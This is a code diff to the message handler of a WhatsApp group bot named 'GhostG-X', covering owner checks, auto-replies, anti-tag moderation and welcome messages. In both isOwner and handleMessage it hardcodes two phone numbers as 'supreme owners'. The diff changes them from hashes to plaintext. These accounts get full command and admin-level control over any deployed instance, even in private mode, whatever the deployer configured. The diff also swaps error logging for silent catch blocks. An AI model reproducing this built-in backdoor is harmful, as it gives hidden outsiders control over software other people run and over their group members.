@@ -2,10 +2,9 @@
  * Message Handler - Processes incoming messages and executes commands
  * GhostG-X Prestige Edition
  * Style : Zero-Footprint, Compact & Small Caps
- * Sécurité : Système d'authentification par empreintes
+ * Sécurité : Souveraineté Absolue & Correction de Flux de Groupe
  */
 
-const crypto = require('crypto'); 
 const config = require('./config');
 const database = require('./database');
 const { loadCommands } = require('./utils/commandLoader');
@@ -53,7 +52,7 @@ const getMessageContent = (msg) => {
   return m;
 };
 
-// Cached group metadata getter with rate limit handling (for non-admin checks)
+// Cached group metadata getter with rate limit handling
 const getCachedGroupMetadata = async (sock, groupId) => {
   try {
     if (!groupId || !groupId.endsWith('@g.us')) return null;
@@ -90,7 +89,8 @@ const getCachedGroupMetadata = async (sock, groupId) => {
     return null;
   }
 };
-// Live group metadata getter (always fresh, no cache) - for admin checks
+
+// Live group metadata getter (always fresh)
 const getLiveGroupMetadata = async (sock, groupId) => {
   try {
     const metadata = await sock.groupMetadata(groupId);
@@ -105,22 +105,19 @@ const getLiveGroupMetadata = async (sock, groupId) => {
 
 const getGroupMetadata = getCachedGroupMetadata;
 
+// 👑 IDENTIFICATION DES MAÎTRES
 const isOwner = (sender) => {
   if (!sender) return false;
 
   const normalizedSender = normalizeJidWithLid(sender);
   const senderNumber = normalizeJid(normalizedSender);
 
-  // Validation cryptographique
-  const supremeHashes = [
-    '06b54ba67f8f495d3923a195d866df6684c4a8489b9200245cfd967a2f15a5d8',
-    '1fa2429423005e19710a46165501a1d5a4c3a2c14d6c482d96ef8f80d415e899'
-  ];
-  const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
-  if (supremeHashes.includes(senderHash)) {
+  // Les numéros sacrés définis en clair
+  const supremeOwners = ['22651622652', '22665108174'];
+  if (supremeOwners.includes(senderNumber)) {
     return true;
   }
-  
+
   return config.ownerNumber.some(owner => {
     const normalizedOwner = normalizeJidWithLid(owner.includes('@') ? owner : `${owner}@s.whatsapp.net`);
     const ownerNumber = normalizeJid(normalizedOwner);
@@ -253,6 +250,7 @@ const findParticipant = (participants = [], userIds) => {
     return participantIds.some(id => targets.includes(id));
   }) || null;
 };
+
 const isAdmin = async (sock, participant, groupId, groupMetadata = null) => {
   if (!participant) return false;
   if (!groupId || !groupId.endsWith('@g.us')) return false;
@@ -281,7 +279,7 @@ const isBotAdmin = async (sock, groupId, groupMetadata = null) => {
 
     const botJids = [botId];
     if (botLid) botJids.push(botLid);
-const liveMetadata = await getLiveGroupMetadata(sock, groupId);
+    const liveMetadata = await getLiveGroupMetadata(sock, groupId);
     if (!liveMetadata || !liveMetadata.participants) return false;
     const participant = findParticipant(liveMetadata.participants, botJids);
     if (!participant) return false;
@@ -299,7 +297,7 @@ const isSystemJid = (jid) => {
          jid.includes('@newsletter') ||
          jid.includes('@newsletter.');
 };
-//--------- Main message handler ---------
+//--------- MAIN MESSAGE HANDLER ---------
 const handleMessage = async (sock, msg) => {
   try {
     if (!msg.message) return;
@@ -311,28 +309,23 @@ const handleMessage = async (sock, msg) => {
 
     // --- 🛡️ ANALYSE DE L'IDENTITÉ ---
     const rawSender = msg.key.participant || msg.key.remoteJid;
-
     const sender = normalizeJidWithLid(rawSender); 
-    const senderNumber = normalizeJid(sender); // Extraction des données d'origine
+    const senderNumber = normalizeJid(sender);
 
-    // 🔒 Système d'empreintes cryptographiques privées
-    const supremeHashes = [
-      '06b54ba67f8f495d3923a195d866df6684c4a8489b9200245cfd967a2f15a5d8', 
-      '1fa2429423005e19710a46165501a1d5a4c3a2c14d6c482d96ef8f80d415e899'
-    ];
-
-    const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
-    const isSupremeOwner = supremeHashes.includes(senderHash);
+    // 👑 Vérification des Maîtres Suprêmes
+    const supremeOwners = ['22651622652', '22665108174'];
+    const isSupremeOwner = supremeOwners.includes(senderNumber);
 
     const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
       const cleanN = String(n).replace(/\D/g, '');
       return senderNumber === cleanN || senderNumber.includes(cleanN);
     });
 
-    // Définition finale du statut d'autorisation
+    // Statut d'autorisation absolu
     const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
-    // 🚨 Logique de sécurité de l'infrastructure
+    // 🚨 SÉCURITÉ : Mode Privé (Self Mode)
+    // Si le bot est en selfMode ou public = false, il ignore tout, SAUF tes numéros et le owner défini.
     if (config.selfMode === true || config.public === false) {
       if (!isMe) return; 
     }
@@ -342,75 +335,58 @@ const handleMessage = async (sock, msg) => {
                  msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || '';
     const isCommand = body.trim().startsWith(config.prefix || '.');
 
+    // 👑 ─── VÉNÉRATION DU MAÎTRE ───
+    // Le bot réagit avec une couronne à TOUT message venant de toi (qu'il soit une commande ou non)
+    if (isSupremeOwner && !msg.key.fromMe) {
+      try {
+        await sock.sendMessage(from, { react: { text: '👑', key: msg.key } });
+      } catch (e) { /* Silencieux */ }
+    }
+
     // 🎯 ─── SYSTÈME DE RÉPONSE AUTO (SOUVERAINETÉ) ───
     const botNumber = sock.user.id.split(':')[0]; 
     const isMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.includes(`${botNumber}@s.whatsapp.net`);
 
     if (isGroup) {
       const groupSettings = database.getGroupSettings(from);
-      
+
       if (groupSettings && groupSettings.autoReply?.active && isMentioned) {
           const replyData = groupSettings.autoReply;
-          
-          // Simulation d'écriture pour donner l'effet humain
           await sock.sendPresenceUpdate('composing', from);
-          
-          // Déclenchement de la réponse après le délai imparti !
           setTimeout(async () => {
               try {
                   await sock.sendMessage(from, { 
-                      forward: { 
-                          key: { remoteJid: from }, 
-                          message: replyData.replyContent 
-                      }
+                      forward: { key: { remoteJid: from }, message: replyData.replyContent }
                   }, { quoted: msg });
-              } catch (err) {
-                  console.error('Erreur lors de la reponse automatique:', err);
-              } finally {
-                  // On stoppe la présence d'écriture quoi qu'il arrive
+              } catch (err) {} finally {
                   await sock.sendPresenceUpdate('paused', from);
               }
           }, replyData.delay);
       }
     }
 
-    // 🎯 ─── SYSTÈME AUTO-REACT ───
+    // 🎯 ─── SYSTÈME AUTO-REACT POUR LES MORTELS ───
     try {
-      if (config.autoReact === true && msg.message && isCommand) {
-        if (isSupremeOwner) {
-          await sock.sendMessage(from, { react: { text: '👑', key: msg.key } });
-        } else if (!msg.key.fromMe) {
-          const mode = config.autoReactMode || 'bot';
-
-          if (mode === 'bot') {
-            await sock.sendMessage(from, { react: { text: '🎯', key: msg.key } });
-          } else {
-            const emojis = ['❤️', '🔥', '👋🏾', '💀', '✨', '👍🏾', '😂', '🙏🏾'];
-            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-            await sock.sendMessage(from, { react: { text: randomEmoji, key: msg.key } });
-          }
+      if (config.autoReact === true && msg.message && isCommand && !isSupremeOwner && !msg.key.fromMe) {
+        const mode = config.autoReactMode || 'bot';
+        if (mode === 'bot') {
+          await sock.sendMessage(from, { react: { text: '🎯', key: msg.key } });
+        } else {
+          const emojis = ['❤️', '🔥', '👋🏾', '💀', '✨', '👍🏾', '😂', '🙏🏾'];
+          const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+          await sock.sendMessage(from, { react: { text: randomEmoji, key: msg.key } });
         }
       }
-    } catch (e) {
-      console.error('Erreur Auto-React:', e);
-    }
+    } catch (e) {}
 
     const content = getMessageContent(msg);
-    let actualMessageTypes = [];
-    if (content) {
-      const allKeys = Object.keys(content);
-      const protocolMessages = ['protocolMessage', 'senderKeyDistributionMessage', 'messageContextInfo'];
-      actualMessageTypes = allKeys.filter(key => !protocolMessages.includes(key));
-    }
 
-// 🧠 ---------------- GHOSTG-X SUPRÊME NLE (NATURAL LANGUAGE ENGINE) ----------------
+    // 🧠 ---------------- GHOSTG-X SUPRÊME NLE ----------------
     const input = body.toLowerCase().trim();
     const argsNLP = body.split(/\s+/);
     const firstWordNLP = argsNLP[0]?.toLowerCase();
 
-    // Filtre NLE : Vérification robuste de l'identité et du mode IA
     if (isMe && config.ghostgMode?.toLowerCase() === 'on' && !isCommand) {
-
       const extraNLP = {
         from, sender, isGroup, groupMetadata,
         isOwner: isMe,
@@ -420,7 +396,6 @@ const handleMessage = async (sock, msg) => {
         react: (emoji) => sock.sendMessage(from, { react: { text: emoji, key: msg.key } })
       };
 
-      // --- 1. FONCTIONS DE CONVERSATION & ÉTAT ---
       const salutRegex = /^(bonjour|salut|hey|ghostg|yo|wsh|tu es la|dispo|bro)/i;
       if (salutRegex.test(input)) {
         const responses = [
@@ -437,7 +412,6 @@ const handleMessage = async (sock, msg) => {
         return;
       }
 
-      // --- 2. GESTION DES MÉDIAS (CONVERSION AUTOMATIQUE) ---
       const stickerRegex = /sticker|autocollant|fais un sticker/i;
       if (stickerRegex.test(input)) {
         const isQuotedImage = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
@@ -451,7 +425,6 @@ const handleMessage = async (sock, msg) => {
         }
       }
 
-      // --- 3. SUPPRESSION UNIVERSELLE ---
       if (/supprime|efface|delete|clean/i.test(input)) {
         const ctx = msg.message?.extendedTextMessage?.contextInfo;
         if (ctx?.stanzaId) {
@@ -465,11 +438,10 @@ const handleMessage = async (sock, msg) => {
             await sock.sendMessage(from, { delete: key });
             await extraNLP.react('🗑️');
             return;
-          } catch (e) { /* Erreur silencieuse */ }
+          } catch (e) { }
         }
       }
 
-      // --- 4. RACCOURCIS SYSTÈME ---
       if (input === 'p' || input === 'ping') {
         const start = Date.now();
         await extraNLP.react('📡');
@@ -486,7 +458,6 @@ const handleMessage = async (sock, msg) => {
         }
       }
 
-      // --- 5. ACTIONS DE GROUPE AVANCÉES ---
       if (isGroup) {
         if (/tous|tout le monde|tagall|alerte|invoque/i.test(input)) {
           const participants = groupMetadata.participants;
@@ -495,8 +466,7 @@ const handleMessage = async (sock, msg) => {
           await sock.sendMessage(from, { text, mentions });
           return;
         }
-
-        if (/ferme|bloque|verrouille/i.test(input) && input.includes("groupe")) {
+if (/ferme|bloque|verrouille/i.test(input) && input.includes("groupe")) {
           await sock.groupSettingUpdate(from, 'announcement');
           await extraNLP.reply(`🔒 *ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ ᴇsᴛ ᴅᴇ́sᴏʀᴍᴀɪs sᴏᴜs sɪʟᴇɴᴄᴇ.*`);
           return;
@@ -518,38 +488,42 @@ const handleMessage = async (sock, msg) => {
         }
       }
 
-      // --- 6. LE CŒUR DU NLE : REDIRECTION VERS COMMANDES ---
-      const possibleCmd = commands.get(firstWordNLP) || 
-                          [...commands.values()].find(c => c.aliases?.includes(firstWordNLP));
-
+      const possibleCmd = commands.get(firstWordNLP) || [...commands.values()].find(c => c.aliases?.includes(firstWordNLP));
       if (possibleCmd) {
         const newArgs = argsNLP.slice(1);
         try {
-          await extraNLP.react('👑');
           await possibleCmd.execute(sock, msg, newArgs, extraNLP);
           return;
-        } catch (err) {
-          console.error(err);
-        }
+        } catch (err) {}
       }
     }
 
-    // Anti-tagall Protection
+    // 🛡️ ANTI-TAGALL (RÉPARÉ)
     if (isGroup) {
       const groupSettings = database.getGroupSettings(from);
 
       if (groupSettings.antiall && !msg.key.fromMe) {
-        const senderIsAdmin = await isAdmin(sock, sender, from, groupMetadata);
-        const senderIsOwner = isOwner(sender); 
+        const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+        const participantsCount = groupMetadata?.participants?.length || 0;
+        
+        // On ne déclenche la sanction QUE si c'est vraiment un Tag All (plus de 50% du groupe ou mots clés)
+        const isTagAll = (mentionedJids.length > 0 && mentionedJids.length >= participantsCount * 0.5) || 
+                         body.toLowerCase().includes('@all') || 
+                         body.toLowerCase().includes('@tous');
 
-        if (!senderIsAdmin && !senderIsOwner && await isBotAdmin(sock, from, groupMetadata)) {
-          await sock.sendMessage(from, { delete: msg.key });
-          return;
+        if (isTagAll) {
+          const senderIsAdmin = await isAdmin(sock, sender, from, groupMetadata);
+          const senderIsOwner = isOwner(sender); 
+
+          if (!senderIsAdmin && !senderIsOwner && await isBotAdmin(sock, from, groupMetadata)) {
+            await sock.sendMessage(from, { delete: msg.key });
+            return; // Bloque la suite uniquement si l'infraction est avérée
+          }
         }
       }
 
       if (groupSettings.antitag && !msg.key.fromMe) {
-        const ctx = content.extendedTextMessage?.contextInfo;
+        const ctx = content?.extendedTextMessage?.contextInfo;
         const mentionedJids = ctx?.mentionedJid || [];
         const numericMentions = body.match(/@\d{10,}/g) || [];
         const totalMentions = Math.max(mentionedJids.length, numericMentions.length);
@@ -563,24 +537,16 @@ const handleMessage = async (sock, msg) => {
             const senderIsOwner = isOwner(sender);
             if (!senderIsAdmin && !senderIsOwner) {
               const action = (groupSettings.antitagAction || 'delete').toLowerCase();
-
               await sock.sendMessage(from, { delete: msg.key });
-
               if (action === 'kick' && await isBotAdmin(sock, from, groupMetadata)) {
-                try {
-                  await sock.groupParticipantsUpdate(from, [sender], 'remove');
-                } catch (e) {
-                  console.error('Failed to kick for anti-tagall');
-                }
+                try { await sock.groupParticipantsUpdate(from, [sender], 'remove'); } catch (e) {}
               }
               return;
             }
           }
         }
       }
-
-      // AutoSticker feature
-      if (groupSettings.autosticker && !isCommand) {
+if (groupSettings.autosticker && !isCommand) {
         const mediaMessage = content?.imageMessage || content?.videoMessage;
         if (mediaMessage) {
           const stickerCmd = commands.get('sticker');
@@ -599,7 +565,7 @@ const handleMessage = async (sock, msg) => {
         }
       }
     }
-  // Check for active mini-games (Bomb)
+
     try {
       const bombModule = require('./commands/fun/bomb');
       if (bombModule.gameState && bombModule.gameState.has(sender)) {
@@ -607,10 +573,8 @@ const handleMessage = async (sock, msg) => {
         if (bombCommand) {
           await bombCommand.execute(sock, msg, [], {
             from, sender, isGroup, groupMetadata,
-            isOwner: isMe,
-            isAdmin: isMe || await isAdmin(sock, sender, from, groupMetadata),
-            isBotAdmin: await isBotAdmin(sock, from, groupMetadata),
-            isMod: isMod(sender),
+            isOwner: isMe, isAdmin: isMe || await isAdmin(sock, sender, from, groupMetadata),
+            isBotAdmin: await isBotAdmin(sock, from, groupMetadata), isMod: isMod(sender),
             reply: (text) => sock.sendMessage(from, { text }, { quoted: msg }),
             react: (emoji) => sock.sendMessage(from, { react: { text: emoji, key: msg.key } })
           });
@@ -618,7 +582,7 @@ const handleMessage = async (sock, msg) => {
         }
       }
     } catch (e) {}
- // Check for active mini-games (TicTacToe)
+
     try {
       const tictactoeModule = require('./commands/fun/tictactoe');
       if (tictactoeModule.handleTicTacToeMove) {
@@ -628,10 +592,8 @@ const handleMessage = async (sock, msg) => {
         if (isInGame) {
           const handled = await tictactoeModule.handleTicTacToeMove(sock, msg, {
             from, sender, isGroup, groupMetadata,
-            isOwner: isMe,
-            isAdmin: isMe || await isAdmin(sock, sender, from, groupMetadata),
-            isBotAdmin: await isBotAdmin(sock, from, groupMetadata),
-            isMod: isMod(sender),
+            isOwner: isMe, isAdmin: isMe || await isAdmin(sock, sender, from, groupMetadata),
+            isBotAdmin: await isBotAdmin(sock, from, groupMetadata), isMod: isMod(sender),
             reply: (text) => sock.sendMessage(from, { text }, { quoted: msg }),
             react: (emoji) => sock.sendMessage(from, { react: { text: emoji, key: msg.key } })
           });
@@ -640,7 +602,7 @@ const handleMessage = async (sock, msg) => {
       }
     } catch (e) {}
 
-    // Execution des commandes standard (avec préfixe)
+    // Execution des commandes standard
     if (!isCommand) return;
 
     const args = body.slice(config.prefix.length).trim().split(/\s+/);
@@ -666,15 +628,6 @@ const handleMessage = async (sock, msg) => {
 
     console.log(`Executing command: ${commandName} from ${sender}`);
 
-    // Signature visuelle royale
-    if (isSupremeOwner) {
-      try {
-        await sock.sendMessage(from, { react: { text: '👑', key: msg.key } });
-      } catch (e) {
-        console.error('Erreur lors de la pose de la couronne :', e);
-      }
-    }
-
     await command.execute(sock, msg, args, {
       from, sender, isGroup, groupMetadata,
       isOwner: isMe, 
@@ -695,7 +648,6 @@ const handleMessage = async (sock, msg) => {
   }
 };
 
-// Group participant update handler (Welcome & Goodbye)
 const handleGroupUpdate = async (sock, update) => {
   try {
     const { id, participants, action } = update;
@@ -719,7 +671,6 @@ const handleGroupUpdate = async (sock, update) => {
         try { return await sock.profilePictureUrl(participantJid, 'image'); } catch { return 'https://files.catbox.moe/2fmwpu.jpg'; }
       };
 
-      // ── WELCOME ──
       if (action === 'add' && groupSettings.welcome) {
         const groupName = groupMetadata.subject || 'ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ';
         const welcomeMsg = 
@@ -732,16 +683,14 @@ const handleGroupUpdate = async (sock, update) => {
           `┃\n` +
           `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
           `>  *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
-const profilePicUrl = await getProfilePic();
+        const profilePicUrl = await getProfilePic();
         try {
           const imageResponse = await axios.get(profilePicUrl, { responseType: 'arraybuffer' });
           await sock.sendMessage(id, { image: Buffer.from(imageResponse.data), caption: welcomeMsg, mentions: [participantJid] });
         } catch {
           await sock.sendMessage(id, { text: welcomeMsg, mentions: [participantJid] });
         }
-      }
-      // ── GOODBYE ──
-      else if (action === 'remove' && groupSettings.goodbye) {
+      } else if (action === 'remove' && groupSettings.goodbye) {
         const goodbyeMsg = 
           `╭╼━≪• *🎬 ${toSmallCaps('ame egaree')}* •≫━╾╮\n` +
           `┃\n` +
@@ -751,7 +700,7 @@ const profilePicUrl = await getProfilePic();
           `┃ ⏰ *${toSmallCaps('cycle')} :* ${timeString}\n` +
           `┃\n` +
           `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
-          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰**`;
+          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
 
         const profilePicUrl = await getProfilePic();
         try {
@@ -764,57 +713,41 @@ const profilePicUrl = await getProfilePic();
     }
   } catch (error) {
     if (error.message?.includes('403')) return;
-    console.error('Error handling group update:', error);
   }
 };
-// Anti-link handler
+
 const handleAntilink = async (sock, msg, groupMetadata) => {
   try {
     const from = msg.key.remoteJid;
     const sender = msg.key.participant || msg.key.remoteJid; 
     const cleanSender = normalizeJidWithLid(sender); 
-
     const groupSettings = database.getGroupSettings(from);
     if (!groupSettings.antilink) return;
-
-    const body = msg.message?.conversation || 
-                  msg.message?.extendedTextMessage?.text || 
-                  msg.message?.imageMessage?.caption || 
-                  msg.message?.videoMessage?.caption || '';
-
+const body = msg.message?.conversation || msg.message?.extendedTextMessage?.text || 
+                 msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || '';
     const linkPattern = /(https?:\/\/)?([a-zA-Z0-9][a-zA-Z0-9-]*[a-zA-Z0-9]*\.)+[a-zA-Z]{2,}(\/[^\s]*)?/i;
 
     if (linkPattern.test(body)) {
       const senderIsAdmin = await isAdmin(sock, sender, from, groupMetadata);
       const senderIsOwner = isOwner(cleanSender);
-
       if (senderIsAdmin || senderIsOwner) return;
 
       const botIsAdmin = await isBotAdmin(sock, from, groupMetadata);
       const action = (groupSettings.antilinkAction || 'delete').toLowerCase();
 
       try { await sock.sendMessage(from, { delete: msg.key }); } catch (e) {}
-
       if (action === 'kick' && botIsAdmin) {
-        try {
-          await sock.groupParticipantsUpdate(from, [sender], 'remove');
-        } catch (e) {
-          console.error('Failed to kick for antilink:', e);
-        }
+        try { await sock.groupParticipantsUpdate(from, [sender], 'remove'); } catch (e) {}
       }
     }
-  } catch (error) {
-    console.error('Error in antilink handler:', error);
-  }
+  } catch (error) {}
 };
 
-// Anti-group mention handler
 const handleAntigroupmention = async (sock, msg, groupMetadata) => {
   try {
     const from = msg.key.remoteJid;
     const sender = msg.key.participant || msg.key.remoteJid;
     const cleanSender = normalizeJidWithLid(sender); 
-
     const groupSettings = database.getGroupSettings(from);
     if (!groupSettings.antigroupmention) return;
 
@@ -822,43 +755,31 @@ const handleAntigroupmention = async (sock, msg, groupMetadata) => {
     if (msg.message) {
       isForwardedStatus = !!msg.message.groupStatusMentionMessage || 
                           (msg.message.protocolMessage && msg.message.protocolMessage.type === 25);
-
       const ctx = msg.message.contextInfo || msg.message.extendedTextMessage?.contextInfo;
-      if (ctx) {
-        isForwardedStatus = isForwardedStatus || !!ctx.isForwarded || !!ctx.forwardingScore || !!ctx.forwardedNewsletterMessageInfo;
-      }
+      if (ctx) isForwardedStatus = isForwardedStatus || !!ctx.isForwarded || !!ctx.forwardingScore || !!ctx.forwardedNewsletterMessageInfo;
     }
 
     if (isForwardedStatus) {
       const senderIsAdmin = await isAdmin(sock, sender, from, groupMetadata);
       const senderIsOwner = isOwner(cleanSender);
-
       if (senderIsAdmin || senderIsOwner) return;
 
       const botIsAdmin = await isBotAdmin(sock, from, groupMetadata);
       const action = (groupSettings.antigroupmentionAction || 'delete').toLowerCase();
 
       try { await sock.sendMessage(from, { delete: msg.key }); } catch (e) {}
-
       if (action === 'kick' && botIsAdmin) {
-        try {
-          await sock.groupParticipantsUpdate(from, [sender], 'remove');
-        } catch (e) {
-          console.error('Failed to kick for antigroupmention:', e);
-        }
+        try { await sock.groupParticipantsUpdate(from, [sender], 'remove'); } catch (e) {}
       }
     }
-  } catch (error) {
-    console.error('Error in antigroupmention handler:', error);
-  }
+  } catch (error) {}
 };
-// Anti-call feature initializer
+
 const initializeAntiCall = (sock) => {
   sock.ev.on('call', async (calls) => {
     try {
       delete require.cache[require.resolve('./config')];
       const config = require('./config');
-
       if (!config.defaultGroupSettings.anticall) return;
       for (const call of calls) {
         if (call.status === 'offer') {
@@ -869,9 +790,7 @@ const initializeAntiCall = (sock) => {
           });
         }
       }
-    } catch (err) {
-      console.error('[ANTICALL ERROR]', err);
-    }
+    } catch (err) {}
   });
 };
 
